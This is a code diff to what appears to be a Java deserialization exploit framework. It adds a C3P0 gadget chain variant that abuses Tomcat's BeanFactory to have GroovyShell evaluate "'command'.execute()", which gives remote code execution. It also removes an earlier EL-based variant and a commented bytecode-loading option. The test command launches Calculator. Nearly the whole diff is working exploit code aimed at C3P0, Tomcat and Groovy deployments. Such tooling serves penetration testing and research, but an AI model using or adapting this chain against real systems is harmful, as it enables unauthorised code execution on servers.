@@ -3,7 +3,6 @@ package com.ppp.chain.c3p0;
 import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
 import com.ppp.JavaClassHelper;
 import com.ppp.ObjectPayload;
-import com.ppp.annotation.Authors;
 import com.ppp.annotation.Dependencies;
 import com.ppp.secmgr.PayloadRunner;
 import com.ppp.sinks.SinkScheduler;
@@ -27,37 +26,24 @@ import java.sql.SQLFeatureNotSupportedException;
 import java.util.logging.Logger;
 
 /**
- * EL
+ * Groovy
  */
-@Dependencies({"com.mchange:c3p0:0.9.5.2", "com.mchange:mchange-commons-java:0.2.11", "org.apache.tomcat:<=8.5.78"})
-@Authors({Authors.MBECHLER})
+@Dependencies({"com.mchange:c3p0:0.9.5.2", "com.mchange:mchange-commons-java:0.2.11", "org.apache:tomcat:8.5.35", "org.codehaus.groovy:groovy:2.3.9"})
 @Sink({Sink.C3P0})
-public class C3P0_2 implements ObjectPayload<Object> {
+public class C3P0_3 implements ObjectPayload<Object> {
 
     public static void main(String[] args) throws Exception {
 //        PayloadRunner.run(C3P0.class, args);
 
         // rce
         SinksHelper sinksHelper = new SinksHelper();
-        sinksHelper.setSink(C3P0_2.class.getAnnotation(Sink.class).value()[0]);
+        sinksHelper.setSink(C3P0_3.class.getAnnotation(Sink.class).value()[0]);
         sinksHelper.setEnchant(EnchantType.Command);
-        sinksHelper.setCommandType(EnchantEnums.Runtime);
+        sinksHelper.setCommandType(EnchantEnums.Default);
         sinksHelper.setCommand("open -a Calculator.app");
         JavaClassHelper javaClassHelper = new JavaClassHelper();
         sinksHelper.setJavaClassHelper(javaClassHelper);
-        PayloadRunner.run(C3P0_2.class, args, sinksHelper);
-
-        // 字节码加载
-//        SinksHelper sinksHelper = new SinksHelper();
-//        sinksHelper.setSink(C3P0_2.class.getAnnotation(Sink.class).value()[0]);
-//        sinksHelper.setEnchant(EnchantType.LocalLoad);
-//        sinksHelper.setSave(true);
-//        JavaClassHelper javaClassHelper = new JavaClassHelper();
-//        javaClassHelper.setJavaClassHelperType(JavaClassHelperType.RceEcho);
-//        javaClassHelper.setMiddleware(Middleware.Tomcat);
-//        javaClassHelper.setRandomJavaClassName(false);
-//        sinksHelper.setJavaClassHelper(javaClassHelper);
-//        PayloadRunner.run(C3P0_2.class, args, sinksHelper);
+        PayloadRunner.run(C3P0_3.class, args, sinksHelper);
     }
 
     public Object getObject(SinksHelper sinksHelper) throws Exception {
@@ -84,19 +70,19 @@ public class C3P0_2 implements ObjectPayload<Object> {
 
     private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {
 
-        private String script;
+        private String command;
 
-        public PoolSource(String script) {
-            this.script = script;
+        public PoolSource(String command) {
+            this.command = command;
         }
 
         public Reference getReference() throws NamingException {
             String s = RanDomUtils.generateRandomString(3);
-            ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
-            resourceRef.add(new StringRefAddr("forceString", s + "=eval"));
+            ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
+            ref.add(new StringRefAddr("forceString", s + "=evaluate"));
 
-            resourceRef.add(new StringRefAddr(s, script));
-            return resourceRef;
+            ref.add(new StringRefAddr(s, String.format("'%s'.execute()", command)));
+            return ref;
         }
 
         public PrintWriter getLogWriter() throws SQLException {
